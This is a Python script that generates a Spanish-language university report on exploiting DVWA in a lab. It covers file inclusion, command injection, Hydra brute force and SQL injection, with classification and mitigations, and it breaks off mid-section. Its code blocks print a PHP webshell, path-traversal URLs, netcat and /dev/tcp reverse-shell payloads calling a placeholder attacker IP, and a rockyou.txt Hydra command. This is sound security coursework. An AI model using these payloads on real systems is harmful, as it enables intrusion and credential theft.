"""
Generador — INFORME #2 GVA
Vulnerabilidades: File Inclusion | Command Injection | Brute Force | SQL Injection
"""

from docx import Document
from docx.shared import Pt, RGBColor, Inches, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import copy, os

BASE = r"c:\Users\Usuario\Desktop\Especializacion CS\01_Materias\Gestion_de_Vulnerabilidades_en_Aplicaciones\INFORME_2_GVA.docx"
OUT  = r"c:\Users\Usuario\Desktop\Especializacion CS\01_Materias\Gestion_de_Vulnerabilidades_en_Aplicaciones\INFORME_2_GVA.docx"

doc = Document(BASE)

# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────

def clear_document(doc):
    """Elimina todos los párrafos y tablas del body (excepto el último párrafo vacío requerido por OOXML)."""
    body = doc.element.body
    for child in list(body):
        tag = child.tag.split('}')[-1]
        if tag in ('p', 'tbl', 'sectPr'):
            if tag != 'sectPr':
                body.remove(child)

def heading(doc, text, level=1, color=None):
    p = doc.add_heading(text, level=level)
    if color:
        for run in p.runs:
            run.font.color.rgb = RGBColor(*color)
    return p

def body(doc, text, bold=False, italic=False, size=11, color=None, align=None):
    p = doc.add_paragraph()
    run = p.add_run(text)
    run.bold = bold
    run.italic = italic
    run.font.size = Pt(size)
    if color:
        run.font.color.rgb = RGBColor(*color)
    if align:
        p.alignment = align
    return p

def bullet(doc, text, bold_prefix=None):
    p = doc.add_paragraph(style='List Bullet')
    if bold_prefix:
        run = p.add_run(bold_prefix)
        run.bold = True
        p.add_run(text)
    else:
        p.add_run(text)
    return p

def numbered(doc, text):
    p = doc.add_paragraph(style='List Number')
    p.add_run(text)
    return p

def code_block(doc, text):
    """Párrafo con estilo de código (fuente monospace, fondo gris via color de texto oscuro)."""
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(1)
    run = p.add_run(text)
    run.font.name = 'Courier New'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x1E, 0x1E, 0x1E)
    # Fondo gris para el párrafo
    pPr = p._p.get_or_add_pPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), 'F0F0F0')
    pPr.append(shd)
    return p

def spacer(doc, n=1):
    for _ in range(n):
        doc.add_paragraph()

def add_table(doc, headers, rows, shaded_header=True):
    tbl = doc.add_table(rows=1 + len(rows), cols=len(headers))
    tbl.style = 'Table Grid'
    tbl.alignment = WD_TABLE_ALIGNMENT.CENTER
    # Header row
    hdr = tbl.rows[0]
    for i, h in enumerate(headers):
        cell = hdr.cells[i]
        cell.text = h
        for run in cell.paragraphs[0].runs:
            run.bold = True
            run.font.size = Pt(10)
        if shaded_header:
            tc = cell._tc
            tcPr = tc.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:color'), 'auto')
            shd.set(qn('w:fill'), '1F3864')
            tcPr.append(shd)
            for run in cell.paragraphs[0].runs:
                run.font.color.rgb = RGBColor(0xFF, 0xFF, 0xFF)
    # Data rows
    for ri, row_data in enumerate(rows):
        row = tbl.rows[ri + 1]
        for ci, val in enumerate(row_data):
            cell = row.cells[ci]
            cell.text = val
            for run in cell.paragraphs[0].runs:
                run.font.size = Pt(10)
            if shaded_header and ri % 2 == 1:
                tc = cell._tc
                tcPr = tc.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:color'), 'auto')
                shd.set(qn('w:fill'), 'DCE8F8')
                tcPr.append(shd)
    return tbl

def section_divider(doc):
    """Línea horizontal visual."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('─' * 70)
    run.font.color.rgb = RGBColor(0xCC, 0xCC, 0xCC)
    run.font.size = Pt(8)


# ─────────────────────────────────────────────
# LIMPIAR Y CONSTRUIR
# ─────────────────────────────────────────────
clear_document(doc)

# ══════════════════════════════════════════════
# PORTADA
# ══════════════════════════════════════════════
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('INFORME #2\nGestión de Vulnerabilidades en Aplicaciones')
run.bold = True
run.font.size = Pt(20)
run.font.color.rgb = RGBColor(0x1F, 0x38, 0x64)

spacer(doc)

p2 = doc.add_paragraph()
p2.alignment = WD_ALIGN_PARAGRAPH.CENTER
run2 = p2.add_run('DVWA: File Inclusion  |  Command Injection  |  Brute Force  |  SQL Injection')
run2.font.size = Pt(12)
run2.font.color.rgb = RGBColor(0x44, 0x72, 0xC4)
run2.bold = True

spacer(doc)

# Tabla de identificación
add_table(doc,
    ['Campo', 'Detalle'],
    [
        ['Asignatura',   'Gestión de Vulnerabilidades en Aplicaciones'],
        ['Programa',     'Especialización en Ciberseguridad'],
        ['Docente',      'Javier Mauricio Durán Vásquez'],
        ['Estudiante',   'Daniel Alejandro Aguirre Ceballos'],
        ['Plataforma',   'DVWA (Damn Vulnerable Web Application) — Nivel Low'],
        ['Fecha entrega','14 de marzo de 2026'],
    ]
)

doc.add_page_break()

# ══════════════════════════════════════════════
# ENTORNO DE TRABAJO
# ══════════════════════════════════════════════
heading(doc, 'Entorno de trabajo', 1)
add_table(doc,
    ['Componente', 'Detalle'],
    [
        ['Sistema atacante',  'Kali Linux (VM) — Prompt: danielaguirre@kali:~$'],
        ['Sistema víctima',   'Metasploitable con DVWA preinstalado'],
        ['Red',               'Red interna entre VMs (sin Internet requerido)'],
        ['Nivel DVWA',        'Low'],
        ['Herramientas',      'Firefox, Hydra, sqlmap, Netcat, Metasploit, Burp Suite'],
    ]
)
spacer(doc)

# ══════════════════════════════════════════════
# MARCO TEÓRICO GENERAL
# ══════════════════════════════════════════════
heading(doc, 'Marco Teórico', 1)

body(doc,
    'DVWA (Damn Vulnerable Web Application) es una aplicación web diseñada intencionalmente '
    'con vulnerabilidades conocidas, utilizada con fines educativos en entornos controlados. '
    'Cada módulo reproduce una debilidad real categorizada por estándares internacionales como '
    'OWASP Top 10, CWE y CVE, permitiendo al estudiante comprender el ciclo completo de un '
    'ataque: identificación, explotación, impacto y mitigación.',
    size=11
)
spacer(doc)

body(doc,
    'Este informe cubre las vulnerabilidades 5 a 8 del laboratorio, correspondientes al Informe #2. '
    'Todas comparten una causa raíz común: la aplicación confía en datos no confiables '
    '(input del usuario, parámetros HTTP, archivos cargados) sin tratarlos con la debida '
    'desconfianza sistemática. La diferencia entre ataques radica en el vector y el '
    'componente del sistema que se ve comprometido.',
    size=11
)

spacer(doc)

body(doc, 'Clasificación OWASP Top 10 (2021) de las vulnerabilidades trabajadas:', bold=True)
add_table(doc,
    ['#', 'Vulnerabilidad', 'Categoría OWASP 2021', 'Severidad típica'],
    [
        ['5', 'File Inclusion (LFI/RFI)', 'A05 – Security Misconfiguration / A03 – Injection', 'Critical'],
        ['6', 'Command Injection',        'A03:2021 – Injection',                               'Critical'],
        ['7', 'Brute Force',              'A07:2021 – Identification & Authentication Failures', 'High'],
        ['8', 'SQL Injection (& Blind)',  'A03:2021 – Injection',                               'Critical'],
    ]
)

doc.add_page_break()

# ══════════════════════════════════════════════
# VUL 5 — FILE INCLUSION
# ══════════════════════════════════════════════
heading(doc, 'Vulnerabilidad 5 — File Inclusion (LFI / RFI)', 1)

# ── TEORÍA ──
heading(doc, 'Teoría', 2)

body(doc,
    'La inclusión de archivos (File Inclusion) es una vulnerabilidad que surge cuando una '
    'aplicación web construye dinámicamente la ruta de un archivo a incluir o ejecutar '
    'usando datos controlables por el usuario, sin validar ni restringir qué archivos '
    'pueden ser referenciados. PHP expone esta debilidad a través de las funciones '
    'include(), require(), include_once() y require_once().',
    size=11
)
spacer(doc)

body(doc, 'Existen dos variantes con impactos distintos:', bold=True)

add_table(doc,
    ['Tipo', 'Descripción', 'Condición necesaria', 'Impacto máximo'],
    [
        ['LFI\n(Local File Inclusion)',
         'El atacante referencia archivos que ya existen en el sistema de archivos local del servidor.',
         'Ninguna adicional',
         'Lectura de archivos sensibles (/etc/passwd, claves SSH, credenciales de BD)'],
        ['RFI\n(Remote File Inclusion)',
         'El atacante apunta a un archivo PHP alojado en un servidor externo; el servidor víctima lo descarga y ejecuta como código.',
         'allow_url_include = On en php.ini',
         'Ejecución remota de código (RCE): shell completa del servidor'],
    ]
)
spacer(doc)

body(doc,
    'Relación con estándares internacionales:',
    bold=True
)
bullet(doc, ' CWE-22 — Path Traversal: acceso a rutas fuera del directorio permitido.', '')
bullet(doc, ' CWE-98 — PHP Remote File Inclusion: inclusión de archivos remotos sin validación.', '')
bullet(doc, ' OWASP: A05:2021 – Security Misconfiguration (RFI) / A03:2021 – Injection (LFI).', '')
bullet(doc, ' CVSS v4.0 estimado: 9.1 Critical (RFI con acceso remoto sin autenticación).', '')

spacer(doc)

body(doc,
    'Fragmento de código vulnerable (DVWA nivel Low):',
    bold=True
)
code_block(doc, '// Código vulnerable — DVWA nivel Low\n$file = $_GET[\'page\'];\ninclude($file);\n// Sin lista blanca, sin sanitización de rutas, sin restricción de esquemas.')

spacer(doc)

body(doc,
    'La función include() en PHP acepta tanto rutas relativas/absolutas del sistema de archivos '
    'como URLs (http://, ftp://) cuando allow_url_include está habilitada. '
    'El código vulnerable no diferencia entre un archivo local esperado y una URL remota '
    'controlada por el atacante: ambas pasan por el mismo include() sin validación.',
    size=11, italic=True
)

spacer(doc)

# ── CAUSAS ──
heading(doc, '1. Descripción de la vulnerabilidad', 2)
body(doc,
    'La inclusión de archivos sin validación permite al atacante manipular el parámetro '
    '?page= de la URL para referenciar archivos arbitrarios del servidor (LFI) o archivos '
    'PHP maliciosos alojados en servidores externos (RFI). En ambos casos la aplicación '
    'ejecuta el contenido del archivo en el contexto del servidor web, otorgando al atacante '
    'capacidades que van desde la lectura de información sensible hasta la ejecución completa '
    'de comandos del sistema operativo.',
    size=11
)

heading(doc, '2. Causas de la vulnerabilidad', 2)
body(doc, 'a. Ausencia de validaciones', bold=True)
body(doc,
    'El parámetro page se pasa directamente a include() sin verificar que el valor '
    'pertenezca a un conjunto permitido de archivos ni que la ruta resultante esté '
    'contenida dentro del webroot.',
)
spacer(doc)
body(doc, 'b. Errores de lógica', bold=True)
body(doc,
    'La aplicación asume que el usuario solo ingresará uno de los archivos esperados. '
    'Este modelo de seguridad basado en supuestos ("el usuario hará lo correcto") es '
    'fundamentalmente inseguro; debe reemplazarse por un modelo basado en restricciones '
    'explícitas ("el usuario solo puede hacer lo que se le permite explícitamente").',
)
spacer(doc)
body(doc, 'c. Manejo inadecuado de entradas y salidas', bold=True)
body(doc,
    'No se eliminan secuencias de path traversal (../, ..\\, %2e%2e%2f), characters nulos '
    '(%00) ni se restringe el uso de esquemas URL en el parámetro. '
    'La directiva allow_url_include = On en php.ini habilita el vector RFI globalmente.',
)

# ── MECANISMO ──
heading(doc, '3. Mecanismo de ataque', 2)

body(doc, 'Ataque LFI — Lectura de archivos locales', bold=True)
body(doc, 'Objetivo: leer /etc/passwd del servidor para enumerar usuarios del SO.')
spacer(doc)

body(doc, 'Paso 1 — Identificar el parámetro vulnerable:')
code_block(doc, 'URL inicial:\nhttp://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=include.php')

body(doc, 'Paso 2 — Payload con path traversal:')
code_block(doc, 'http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd')
body(doc, '→ El servidor devuelve el contenido de /etc/passwd con la lista de usuarios del SO.')

body(doc, 'Paso 3 — Escalar a archivos de configuración con credenciales:')
code_block(doc, 'http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=../../../../var/www/html/dvwa/config/config.inc.php')

body(doc, '[IMAGEN 1 — LFI mostrando /etc/passwd con fecha visible en prompt Kali]', italic=True)
spacer(doc)

body(doc, 'Ataque RFI — Ejecución remota de código', bold=True)
body(doc, 'Objetivo: hospedar un PHP malicioso en Kali y lograr que el servidor víctima lo ejecute.')
spacer(doc)

body(doc, 'Paso 1 — Crear webshell en Kali:')
code_block(doc, "danielaguirre@kali:~$ echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php")

body(doc, 'Paso 2 — Servir el archivo por HTTP:')
code_block(doc, 'danielaguirre@kali:~$ python3 -m http.server 8888')

body(doc, 'Paso 3 — Payload RFI apuntando a la máquina atacante:')
code_block(doc, 'http://<IP_VICTIMA>/dvwa/vulnerabilities/fi/?page=http://<IP_KALI>:8888/shell.php&cmd=id\n\n→ Respuesta: uid=33(www-data) gid=33(www-data) groups=33(www-data)')

body(doc, 'Paso 4 — Reverse shell completa:')
code_block(doc, '# Listener en Kali\ndanielaguirre@kali:~$ nc -lvnp 4444\n\n# Payload RFI\n?page=http://<IP_KALI>:8888/shell.php&cmd=nc -e /bin/bash <IP_KALI> 4444')

body(doc, '[IMAGEN 2 — RFI ejecutando id en servidor víctima — fecha visible]', italic=True)
body(doc, '[IMAGEN 3 — Shell reversa recibida en Netcat — fecha visible]', italic=True)

# ── CLASIFICACIÓN ──
heading(doc, '4. Clasificación técnica', 2)
add_table(doc,
    ['Referencia', 'Detalle'],
    [
        ['CWE-22',      'Path Traversal — limitación impropia de rutas a directorios restringidos'],
        ['CWE-98',      'PHP Remote File Inclusion — control impropio de nombre de archivo en include/require'],
        ['OWASP Top 10','A05:2021 – Security Misconfiguration / A03:2021 – Injection'],
        ['CVSS v4.0',   '~9.1 Critical — RCE remoto sin autenticación vía RFI'],
    ]
)

# ── IMPACTO ──
heading(doc, '5. Impacto esperado en un sistema real', 2)
add_table(doc,
    ['Dimensión CIA', 'Impacto', 'Justificación'],
    [
        ['Confidencialidad', 'CRÍTICO',
         'LFI lee archivos del servidor: /etc/shadow, claves SSH, credenciales de BD, código fuente de la aplicación.'],
        ['Integridad', 'CRÍTICO',
         'RFI ejecuta código arbitrario: puede modificar, crear o eliminar archivos del servidor.'],
        ['Disponibilidad', 'ALTO',
         'Vía RFI se puede interrumpir el servicio, eliminar archivos del sistema o instalar ransomware.'],
    ]
)

# ── MITIGACIÓN ──
heading(doc, '6. Propuesta de mitigación', 2)
bullet(doc, 'Lista blanca de archivos permitidos: solo incluir valores que pertenezcan a un conjunto predefinido.',  '')
code_block(doc, '$allowed = [\'include1.php\', \'include2.php\'];\nif (in_array($_GET[\'page\'], $allowed)) {\n    include($_GET[\'page\']);\n}')
bullet(doc, "Deshabilitar allow_url_include en php.ini: allow_url_include = Off", '')
bullet(doc, "Sanitizar rutas: eliminar ../, ..\\, secuencias %00 y %2e%2e.", '')
bullet(doc, "Principio de mínimo privilegio: el proceso web no debe poder leer fuera del webroot.", '')
bullet(doc, "WAF: bloquear patrones de path traversal en URLs entrantes.", '')

section_divider(doc)
doc.add_page_break()

# ══════════════════════════════════════════════
# VUL 6 — COMMAND INJECTION
# ══════════════════════════════════════════════
heading(doc, 'Vulnerabilidad 6 — Command Injection (Inyección de Comandos OS)', 1)

# ── TEORÍA ──
heading(doc, 'Teoría', 2)
body(doc,
    'La inyección de comandos de sistema operativo (OS Command Injection) ocurre cuando una '
    'aplicación construye una llamada a la shell del sistema usando datos controlables por el '
    'usuario, sin neutralizar los metacaracteres que el intérprete de comandos utiliza para '
    'separar o encadenar instrucciones.',
    size=11
)
spacer(doc)

body(doc,
    'A diferencia de SQL Injection (que afecta al motor de base de datos), Command Injection '
    'afecta directamente al sistema operativo del servidor. El código inyectado se ejecuta con '
    'los privilegios del proceso web (www-data en Apache/Linux), lo que en un servidor mal '
    'configurado puede equivaler a acceso de root.',
    size=11
)
spacer(doc)

body(doc, 'Metacaracteres de shell más frecuentes en ataques:', bold=True)
add_table(doc,
    ['Metacaracter', 'Comportamiento', 'Ejemplo de inyección'],
    [
        [';',         'Ejecuta el segundo comando siempre',                        '127.0.0.1 ; id'],
        ['&&',        'Ejecuta el segundo solo si el primero tuvo éxito',          '127.0.0.1 && whoami'],
        ['||',        'Ejecuta el segundo solo si el primero falló',               'fallo || id'],
        ['|',         'Pipe: salida del primero es input del segundo',             '127.0.0.1 | cat /etc/passwd'],
        ['`cmd`/$()','Sustitución de comandos: ejecuta y sustituye por su salida', '`id`  o  $(id)'],
    ]
)
spacer(doc)

body(doc, 'Fragmento de código vulnerable (DVWA nivel Low):', bold=True)
code_block(doc, "// El parámetro 'ip' se concatena directamente al comando del SO\n$target = $_REQUEST['ip'];\n$cmd = shell_exec('ping -c 4 ' . $target);\necho $cmd;\n// Sin escapeshellarg(), sin regex de IP, sin lista blanca")

spacer(doc)
body(doc,
    'CWE-78 (OS Command Injection) es consistentemente clasificada en OWASP Top 10 Inside A03:2021 '
    'como una de las vulnerabilidades de mayor impacto real. Históricamente, vulnerabilidades como '
    'Shellshock (CVE-2014-6271) demostraron que un server Bash mal configurado podía comprometerse '
    'con una sola petición HTTP maliciosa.',
    size=11, italic=True
)

# ── DESCRIPCIÓN ──
heading(doc, '1. Descripción de la vulnerabilidad', 2)
body(doc,
    'La funcionalidad de "ping" de DVWA toma una dirección IP del usuario y la pasa '
    'a shell_exec() concatenada como argumento. Dado que PHP no escapa los metacaracteres '
    'de shell ni restringe el formato del input, el atacante puede encadenar comandos '
    'adicionales usando separadores como ; o &&, logrando ejecución arbitraria de comandos '
    'con los privilegios del proceso web del servidor.',
)

# ── CAUSAS ──
heading(doc, '2. Causas de la vulnerabilidad', 2)
body(doc, 'a. Ausencia de validaciones', bold=True)
body(doc,
    'No se verifica que $target tenga formato de dirección IPv4. Cualquier cadena, '
    'incluidas las que contienen metacaracteres de shell, es aceptada y pasada a shell_exec().',
)
spacer(doc)
body(doc, 'b. Errores de lógica', bold=True)
body(doc,
    'La aplicación no distingue entre el argumento del comando (dato: la IP) y el comando en sí. '
    'Al concatenar directamente, el SO recibe una cadena completa que puede contener múltiples '
    'comandos separados por metacaracteres.',
)
spacer(doc)
body(doc, 'c. Manejo inadecuado de entradas', bold=True)
body(doc,
    'No se usa escapeshellarg() ni escapeshellcmd(). '
    'Los metacaracteres ; && || | ` $() no son eliminados ni escapados '
    'antes de construir el comando del SO.',
)

# ── MECANISMO ──
heading(doc, '3. Mecanismo de ataque — Ejecución de comandos arbitrarios', 2)
body(doc, 'Objetivo: ejecutar comandos del SO del servidor a través del campo de ping.')
spacer(doc)

body(doc, 'Paso 1 — Confirmar baseline (comportamiento legítimo):')
code_block(doc, 'Input: 127.0.0.1\nComando resultante: ping -c 4 127.0.0.1\nRespuesta: salida normal de ping')

body(doc, 'Paso 2 — Inyección con ; (ejecución secuencial):')
code_block(doc, 'Input: 127.0.0.1 ; id\nComando resultante: ping -c 4 127.0.0.1 ; id\n\nRespuesta incluye:\nuid=33(www-data) gid=33(www-data) groups=33(www-data)')
body(doc, '[IMAGEN 4 — Command injection con ;id mostrando uid del servidor — fecha visible]', italic=True)

spacer(doc)
body(doc, 'Paso 3 — Enumeración del sistema:')
code_block(doc, '127.0.0.1 ; uname -a\n127.0.0.1 ; cat /etc/passwd\n127.0.0.1 ; ls /var/www/html/dvwa/\n127.0.0.1 ; cat /var/www/html/dvwa/config/config.inc.php')

body(doc, 'Paso 4 — Reverse shell:')
code_block(doc, '# Listener en Kali\ndanielaguirre@kali:~$ nc -lvnp 4444\n\n# Payload inyectado en el campo IP\n127.0.0.1 ; bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1\n\n→ Shell interactiva del servidor obtenida en la consola de Kali.')
body(doc, '[IMAGEN 5 — Reverse shell obtenida vía Command Injection — fecha visible]', italic=True)

# ── CLASIFICACIÓN ──
heading(doc, '4. Clasificación técnica', 2)
add_table(doc,
    ['Referencia', 'Detalle'],
    [
        ['CWE-78',      'OS Command Injection — neutralización impropia de elementos especiales en comandos del SO'],
        ['CVE-2014-6271','Shellshock — command injection masivo en Bash a través de variables de entorno HTTP'],
        ['OWASP Top 10','A03:2021 – Injection'],
        ['CVSS v4.0',   '~9.8 Critical — ejecución remota de comandos sin autenticación'],
    ]
)

# ── IMPACTO ──
heading(doc, '5. Impacto esperado en un sistema real', 2)
add_table(doc,
    ['Dimensión CIA', 'Impacto', 'Justificación'],
    [
        ['Confidencialidad', 'CRÍTICO',
         'Lectura de cualquier archivo accesible por www-data: claves SSH, credenciales de BD, código fuente.'],
        ['Integridad', 'CRÍTICO',
         'Escritura de archivos, instalación de malware, creación de nuevos usuarios del SO, modificación de logs.'],
        ['Disponibilidad', 'CRÍTICO',
         'Apagado del servidor, eliminación de archivos críticos, denegación de servicio.'],
    ]
)

# ── MITIGACIÓN ──
heading(doc, '6. Propuesta de mitigación', 2)
bullet(doc, 'Evitar completamente shell_exec(), exec(), system(), passthru() — usar funciones nativas del lenguaje.',  '')
bullet(doc, 'Si es indispensable: validar con regex de IP estricta antes de llamar al SO:',  '')
code_block(doc, "if (preg_match('/^(\\d{1,3}\\.){3}\\d{1,3}$/', $target)) {\n    $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));\n}")
bullet(doc, 'escapeshellarg(): envuelve el argumento en comillas simples y escapa comillas internas.',  '')
bullet(doc, 'Principio de mínimo privilegio: el proceso web no debe tener acceso de escritura al SO.',  '')
bullet(doc, 'WAF: bloquear patrones de metacaracteres de shell en parámetros HTTP.',  '')

section_divider(doc)
doc.add_page_break()

# ══════════════════════════════════════════════
# VUL 7 — BRUTE FORCE
# ══════════════════════════════════════════════
heading(doc, 'Vulnerabilidad 7 — Brute Force (Fuerza Bruta sobre Autenticación)', 1)

# ── TEORÍA ──
heading(doc, 'Teoría', 2)
body(doc,
    'Un ataque de fuerza bruta sobre autenticación prueba sistemáticamente combinaciones de '
    'credenciales hasta encontrar las válidas. Existen dos variantes principales:',
    size=11
)
add_table(doc,
    ['Variante', 'Descripción', 'Herramienta típica'],
    [
        ['Fuerza bruta pura',
         'Prueba todas las combinaciones posibles de caracteres hasta alcanzar la longitud máxima.',
         'hashcat, john'],
        ['Ataque de diccionario',
         'Prueba contraseñas de una lista precompilada de palabras reales, comunes o filtradas de brechas previas.',
         'Hydra, Medusa'],
        ['Credential stuffing',
         'Usa pares usuario/contraseña reales obtenidos de brechas anteriores y los prueba en otros servicios.',
         'Snipr, Burp Suite'],
    ]
)
spacer(doc)

body(doc,
    'El ataque de diccionario es el más común en la práctica: la wordlist rockyou.txt contiene '
    '~14 millones de contraseñas reales filtradas de la brecha de RockYou (2009). '
    'La mayoría de usuarios reutilizan contraseñas débiles o predecibles, lo que hace que '
    'este ataque sea efectivo en segundos contra sistemas sin mecanismos de protección.',
    size=11
)
spacer(doc)

body(doc, 'Problemas de seguridad del mecanismo de autenticación de DVWA nivel Low:', bold=True)
bullet(doc, 'Formulario usa método GET — credenciales viajan en la URL, visibles en logs del servidor.',  '')
bullet(doc, 'Sin límite de intentos fallidos (account lockout).',  '')
bullet(doc, 'Sin CAPTCHA ni challenge-response.',  '')
bullet(doc, 'Sin rate limiting (no hay restricción de velocidad de peticiones).',  '')
bullet(doc, 'Contraseñas hasheadas con MD5 sin salt — algoritmo roto, vulnerable a tablas arcoíris.',  '')

spacer(doc)
body(doc, 'Sobre MD5 como hash de contraseñas:', bold=True)
body(doc,
    'MD5 fue diseñado para verificación de integridad de archivos, no para almacenamiento de contraseñas. '
    'Sus problemas para este uso son: (1) velocidad — una GPU moderna calcula miles de millones de hashes '
    'MD5 por segundo; (2) sin salt — dos usuarios con la misma contraseña tienen el mismo hash, '
    'permitiendo ataques de tablas arcoíris precomputadas; (3) colisiones conocidas — dos entradas '
    'distintas pueden producir el mismo hash. La alternativa correcta es bcrypt, argon2id o scrypt, '
    'algoritmos diseñados específicamente para ser lentos y con salt automático.',
    size=11, italic=True
)

# ── DESCRIPCIÓN ──
heading(doc, '1. Descripción de la vulnerabilidad', 2)
body(doc,
    'La sección Brute Force de DVWA presenta un formulario de login que no implementa ningún '
    'mecanismo de defensa contra intentos repetidos de autenticación. Un atacante puede '
    'automatizar miles de intentos por segundo usando herramientas como Hydra, probando '
    'combinaciones de usuario/contraseña de un diccionario hasta obtener acceso.',
)

# ── CAUSAS ──
heading(doc, '2. Causas de la vulnerabilidad', 2)
body(doc, 'a. Ausencia de validaciones', bold=True)
body(doc,
    'El servidor no lleva conteo de intentos fallidos por usuario ni por IP. '
    'No existe mecanismo de penalización (tiempo de espera o bloqueo) ante credenciales incorrectas repetidas.',
)
spacer(doc)
body(doc, 'b. Errores de lógica', bold=True)
body(doc,
    'El formulario usa método GET, exponiendo las credenciales en la URL. '
    'Las peticiones GET son trivialmente automatizables: Hydra puede repetirlas '
    'modificando solo los parámetros de la cadena de consulta.',
)
spacer(doc)
body(doc, 'c. Manejo inadecuado de credenciales', bold=True)
body(doc,
    'Las contraseñas están almacenadas con hash MD5 sin salt. Además, la respuesta del servidor '
    'ante login fallido ("Username and/or password incorrect.") permite enumerar '
    'la existencia de usuarios cuando el mensaje varía entre usuario inexistente y '
    'contraseña incorrecta (en configuraciones más verbosas).',
)

# ── MECANISMO ──
heading(doc, '3. Mecanismo de ataque — Ataque de diccionario con Hydra', 2)
body(doc, 'Objetivo: obtener las credenciales válidas del panel de login de DVWA.')
spacer(doc)

body(doc, 'Paso 1 — Analizar la petición de login (F12 / Burp Suite):')
code_block(doc, 'URL de login fallido:\nhttp://<IP>/dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login\n\nMensaje de fallo: "Username and/or password incorrect."')

body(doc, 'Paso 2 — Ataque con Hydra (diccionario rockyou.txt):')
code_block(doc,
    'danielaguirre@kali:~$ hydra -l admin \\\n'
    '  -P /usr/share/wordlists/rockyou.txt \\\n'
    '  <IP_VICTIMA> http-get-form \\\n'
    '  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect"\n\n'
    'Desglose:\n'
    '  -l admin          → usuario fijo\n'
    '  -P rockyou.txt    → wordlist de contraseñas\n'
    '  http-get-form     → módulo para formularios con método GET\n'
    '  "ruta:params:msg_fallo" → formato de configuración del módulo'
)

body(doc, 'Paso 3 — Resultado de Hydra:')
code_block(doc, '[80][http-get-form] host: <IP_VICTIMA>   login: admin   password: password\n1 valid password found!')
body(doc, '[IMAGEN 6 — Hydra encontrando credenciales admin/password — fecha visible]', italic=True)

body(doc, 'Paso 4 — Verificación manual:')
body(doc, 'Ingresar admin / password en el formulario → login exitoso.')
body(doc, '[IMAGEN 7 — Login exitoso con credenciales obtenidas por fuerza bruta — fecha visible]', italic=True)

# ── CLASIFICACIÓN ──
heading(doc, '4. Clasificación técnica', 2)
add_table(doc,
    ['Referencia', 'Detalle'],
    [
        ['CWE-307', 'Improper Restriction of Excessive Authentication Attempts'],
        ['CWE-916', 'Use of Password Hash With Insufficient Computational Effort (MD5 sin salt)'],
        ['CWE-521', 'Weak Password Requirements'],
        ['OWASP',   'A07:2021 – Identification and Authentication Failures'],
        ['CVSS v4.0','~7.5 High (red interna) / ~9.8 Critical (exposición pública)'],
    ]
)

# ── IMPACTO ──
heading(doc, '5. Impacto esperado en un sistema real', 2)
add_table(doc,
    ['Dimensión CIA', 'Impacto', 'Justificación'],
    [
        ['Confidencialidad', 'ALTO',
         'Acceso a información privada del usuario: datos personales, historial, mensajes, documentos.'],
        ['Integridad', 'ALTO',
         'El atacante puede modificar datos, realizar transacciones o cambiar configuraciones en nombre de la víctima.'],
        ['Disponibilidad', 'MEDIO',
         'En sistemas con lockout (que DVWA no tiene), bloquear cuentas legítimas causa DoS selectivo.'],
    ]
)

# ── MITIGACIÓN ──
heading(doc, '6. Propuesta de mitigación', 2)
bullet(doc, 'Account lockout: bloquear la cuenta por 15 minutos tras 5 intentos fallidos consecutivos.',  '')
bullet(doc, 'Rate limiting por IP: máximo N solicitudes de login por minuto desde la misma fuente.',  '')
bullet(doc, 'CAPTCHA: incorporar tras 3 intentos fallidos para impedir la automatización.',  '')
bullet(doc, 'MFA (Autenticación Multifactor): el segundo factor protege incluso si la contraseña es comprometida.',  '')
bullet(doc, 'Algoritmos seguros de hashing: bcrypt, argon2id o scrypt con salt aleatorio automático.',  '')
bullet(doc, 'Usar método POST para formularios de login (las credenciales no quedan en la URL ni en logs HTTP).',  '')
bullet(doc, 'Monitorización: alertar al equipo SOC ante múltiples intentos fallidos desde una IP.',  '')

section_divider(doc)
doc.add_page_break()

# ══════════════════════════════════════════════
# VUL 8 — SQL INJECTION
# ══════════════════════════════════════════════
heading(doc, 'Vulnerabilidad 8 — SQL Injection & SQL Injection (Blind)', 1)

# ── TEORÍA ──
heading(doc, 'Teoría', 2)
body(doc,
    'La inyección SQL es probablemente la vulnerabilidad web más estudiada y documentada '
    'de la historia, y aun así continúa siendo una de las más prevalentes. '
    'Ocurre cuando datos proporcionados por el usuario se insertan directamente en una '
    'consulta SQL sin parametrización, permitiendo al atacante alterar la lógica de la '
    'consulta o inyectar sentencias SQL adicionales.',
    size=11
)
spacer(doc)

body(doc,
    'El problema fundamental es la mezcla de código (SQL) con datos (input del usuario) '
    'en una misma cadena de texto. El motor de base de datos no puede distinguir si una '
    'comilla simple que aparece en la cadena fue puesta por el programador o por un atacante.',
    size=11
)
spacer(doc)

body(doc, 'Taxonomía de SQL Injection:', bold=True)
add_table(doc,
    ['Tipo', 'Descripción', 'Indicador'],
    [
        ['In-band / Error-based',
         'La aplicación devuelve los datos extraídos directamente en la respuesta o muestra mensajes de error SQL detallados.',
         'Errores SQL visibles en la página'],
        ['In-band / UNION-based',
         'El atacante usa UNION SELECT para combinar la query original con una query maliciosa y obtener datos en la respuesta.',
         'La respuesta muestra filas adicionales de tablas no esperadas'],
        ['Blind Boolean-based',
         'La aplicación no devuelve datos pero responde de forma diferente ante condiciones verdaderas o falsas (mensaje/comportamiento).',
         'Dos respuestas distintas según el resultado de la condición'],
        ['Blind Time-based',
